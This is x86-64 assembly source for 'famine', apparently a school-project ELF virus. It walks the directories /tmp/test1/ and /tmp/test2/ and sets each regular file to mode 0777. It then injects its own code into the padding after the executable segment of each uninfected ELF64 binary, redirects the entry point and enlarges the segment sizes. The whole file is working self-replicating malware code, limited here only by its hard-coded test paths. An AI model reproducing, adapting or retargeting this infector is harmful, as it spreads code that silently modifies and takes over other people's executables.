; famine elf64 - size 752 bytes

%include "famine.inc"

bits 64
default rel
global _start
section .text

_host:
                mov         rax, __NR_exit						; empty program
                syscall

_start:
                push        rdi
                push        rsi
                push        rcx
                push        rdx

                lea         rax, [rel _start]
                mov         rdx, [rel pie_address]
                sub         rax, rdx
                add         rax, [rel entry]
                push        rax

                lea         rdi, [rel slash_tmp]
.opendir:
                mov         r14, rdi
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, __NR_open
                syscall
                test        eax, eax
                jl          .nextdir                

                mov         [rsp-0x100], rax                    ;rsp-0x100 = directory_fd

.readdir:
                mov         rdx, 0x400
                lea         rsi, [rsp-0x800]
                mov         rdi, [rsp-0x100]                    ;directory fd
                mov         rax, __NR_getdents
                syscall
                test        rax, rax
                jle         .closedir

                xor         r13, r13
                mov         r12, rax
.file:
                lea         rdi, [rsp-0x800]
                add         rdi, r13

                xor         edx, edx

                mov         dx, word [rdi + 0x10]               ; linux d_reclen
                dec         edx
                mov         al, byte [rdi + rdx]                ; linux d_type
                inc         edx
                add         rdi, 18                             ; linux d_name
.increment_idx:
                add         r13, rdx

                cmp         al, DT_REG
                jne         .nextfile

                call        process
.nextfile:
                cmp         r13, r12
                jl          .file
                jmp         .readdir

.closedir:      mov         rdi, [rsp-0x100]
                mov         rax, __NR_close
                syscall
.nextdir:
                xor         ecx, ecx
                mul         ecx
                dec         ecx
                mov         rdi, r14
                repnz       scasb
                cmp         byte [rdi], 0
                jnz         .opendir

                pop         rax
                pop         rdx
                pop         rcx
                pop         rsi
                pop         rdi

                jmp         rax
process:                                                        ; expecting filename in rdi
                                                                ; directory in r14
                mov         rsi, r14
                mov         rax, rdi
                lea         rdi, [rsp - 0xc00]
                mov         rdx, rdi                            ; concat directory and filename

.dirname:       movsb
                cmp         byte [rsi], 0
                jnz         .dirname
                mov         rsi, rax
.filename:      movsb
                cmp         byte [rsi - 1], 0
                jnz         .filename
                mov         rdi, rdx

                push        rdi
                mov         rsi, 0o777
                mov         rax, __NR_chmod                     ; try to set permissions
                syscall
                pop         rdi

                mov         rsi, O_RDWR
                mov         rax, __NR_open
                syscall
                test        eax, eax
                jl          .return

                mov         [rsp-0x118], rax                    ; rsp-0x118 = infect_fd

                lea         rsi, [rsp - 0x300]                  ; rsp-0x300 = fstat buf
                mov         rdi, rax
                mov         rax, __NR_fstat
                syscall
                cmp         rax, 0
                jnz         .close

                mov         rsi, qword [rsp - (0x300-0x30)]     ; linux st_size
                mov         [rsp-0x120], rsi                    ; rsp-0x120 = infect_fsize
                cmp         rsi, 0x1000                         ; file too small
                jl          .close

                xor         r9, r9
                mov         r8, [rsp-0x118]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                                                                ; rsi is filesize
                xor         rdi, rdi
                mov         rax, __NR_mmap
                syscall
                cmp         rax, -4095
                jae         .close

                mov         [rsp-0x128], rax                    ;rsp-0x128 = infect_mem
                mov         rdi, rax

                call        is_valid_elf64
                test        al, al
                jz          .unmap

                call        insert_elf64

.unmap:         mov         rsi, [rsp-0x120]                    ; infect_fsize
                mov         rdi, [rsp-0x128]                    ; infect_mem
                mov         rax, __NR_munmap
                syscall

.close:         mov         rdi, [rsp-0x118]
                mov         rax, __NR_close
                syscall
.return:        ret

is_valid_elf64:                                                 ; expecing data in rdi
                xor         rax, rax                            ; result in rax; 1 = valid
                cmp         qword [rdi + 8], rax
                jnz         .return
                mov         rdx, ELF_SYSV
                cmp         qword [rdi], rdx
                jz          .continue
                mov         rdx, ELF_GNU
                cmp         qword [rdi], rdx
                jnz         .return
.continue:      mov         rdx, ELF64_ET_DYN
                cmp         qword [rdi + 0x10], rdx
                jz          .ok
                mov         rdx, ELF64_ET_EXEC
                cmp         qword [rdi + 0x10], rdx
                jnz         .return
.ok:            inc         rax
.return:        ret

insert_elf64:                                                   ; expecting data in rdi
                push        r13
                push        r14
                push        r15

                mov         r15, rdi

                mov         rdx, qword [r15 + 0x18]             ; entry point
                mov         rax, qword [rdi + 0x20]             ; e_phoff
                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
                add         rdi, rax                            ; rdi = *Elf64_Phdr
.segment:       cmp         rcx, 0
                jle         .return
                mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                cmp         rax, qword [rdi]
                jnz         .next
                mov         rax, qword [rdi + 0x10]             ; p_vaddr
                cmp         rdx, rax
                jb          .next
                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
                mov         r13, rax                            ; new entry point
                cmp         rdx, rax
                jae         .next

                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
                add         rax, qword [rdi + 0x20]             ; rax += p_filesz

                mov         r14, rdi                            ; code segment Elf64_Phdr*

                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
                mov         rsi, rdi                            ; save: end of segment
                xor         al, al
                mov         rcx, _finish - _start
                repz        scasb
                test        rcx, rcx
                ja          .return                             ; not enough room

                lea         rdi, [rel _start]
                xchg        rdi, rsi
                mov         rax, [rel signature]
                cmp         rax, qword [rdi - (_finish - signature)]
                jz          .return                             ; already infected
                mov         rcx, _finish - _start
                repnz       movsb
                                                                ;r15 = beginning of file
                                                                ;r14 = code segment header
                                                                ;r13 = new entry point
                mov         rax, qword [r15 + 0x18]             ; entry point
                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
                mov         qword [r15 + 0x18], r13             ; fix entry point
                mov         rax, _finish - _start
                add         qword [r14 + 0x20], rax             ; increase p_filesz
                add         qword [r14 + 0x28], rax             ; increase p_memsz
                jmp         .return

.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
                dec         rcx
                jmp         .segment

.return:
                pop         r15
                pop         r14
                pop         r13
                ret

slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
signature       db          "famine! linux @42siliconvalley",0

pie_address     dq          (_start - _host)
entry           dq          0
_finish:
